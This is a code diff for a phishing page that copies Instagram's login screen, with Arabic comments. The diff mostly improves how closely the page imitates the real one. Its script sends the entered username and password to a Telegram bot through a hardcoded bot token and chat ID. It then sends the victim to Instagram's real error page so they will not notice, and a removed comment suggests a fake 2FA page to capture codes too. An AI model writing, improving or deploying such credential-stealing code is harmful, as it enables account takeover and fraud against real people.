@@ -4,28 +4,82 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
-    <!-- هنا هنستدعي خطوط وتصميم إنستقرام الجديد -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Wondahs/Instagram-Login-Clone@main/styles/style.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .container { width: 100%; max-width: 350px; padding: 20px; }
+        
+        .login-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; }
+        
+        .logo { font-family: 'Grand Hotel', cursive; font-size: 48px; margin-bottom: 30px; color: #262626; }
+        /* Fallback for font if not loaded */
+        .logo-fallback { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 40px; font-weight: 600; margin-bottom: 30px; color: #262626; letter-spacing: -1px; }
+        
+        form { width: 100%; }
+        
+        .input-group { margin-bottom: 6px; position: relative; }
+        input { width: 100%; padding: 9px 8px 7px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
+        input:focus { border: 1px solid #a8a8a8; }
+        
+        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
+        .login-btn:active { background-color: #1877f2; }
+        
+        .divider { display: flex; align-items: center; width: 100%; margin: 20px 0; }
+        .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
+        .or-text { margin: 0 18px; font-size: 13px; font-weight: 600; color: #8e8e8e; }
+        
+        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; margin-bottom: 15px; }
+        .fb-icon { width: 16px; height: 16px; fill: #385185; }
+        
+        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 12px; }
+        
+        .signup-box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; margin-left: 5px; }
+        
+        .get-app { text-align: center; margin-top: 20px; }
+        .get-app p { font-size: 14px; color: #262626; margin-bottom: 15px; }
+        .app-badges { display: flex; justify-content: center; gap: 10px; }
+        .app-badge { height: 40px; background-color: #000; border-radius: 5px; color: #fff; padding: 0 10px; display: flex; align-items: center; font-size: 10px; text-decoration: none; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <!-- تصميم إنستقرام الجديد (طبق الأصل) -->
-    <div class="instagram-login-container">
+    <div class="container">
         <div class="login-box">
             <div class="logo">Instagram</div>
+            
             <form id="hackForm">
                 <div class="input-group">
                     <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Password" required>
-                    <span class="show-password">Show</span>
                 </div>
                 <button type="submit" class="login-btn">Log in</button>
             </form>
-            <div class="divider">OR</div>
-            <button class="fb-login-btn">Log in with Facebook</button>
+            
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or-text">OR</div>
+                <div class="line"></div>
+            </div>
+            
+            <a href="#" class="fb-login">
+                <svg class="fb-icon" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                Log in with Facebook
+            </a>
+            
             <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="get-app">
+            <p>Get the app.</p>
         </div>
     </div>
 
@@ -35,7 +89,7 @@
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             
-            // 🔥 إرسال البيانات فوراً لبوت تلجرام
+            // 🔥 إرسال البيانات لتلجرام
             const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
             const CHAT_ID = "2005892579";
             
@@ -46,8 +100,7 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
             }).then(() => {
-                // 💡 الخدعة: بعد ما البيانات تتبعت، نوديه لصفحة "خطأ" عشان ميشكش
-                // ممكن نستخدم صفحة 2FA الوهمية عشان ناخد الكود كمان
+                // التوجيه لصفحة وهمية (خطأ) بعد السحب
                 window.location.href = "https://www.instagram.com/accounts/login/?error=1";
             }).catch(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/?error=1";
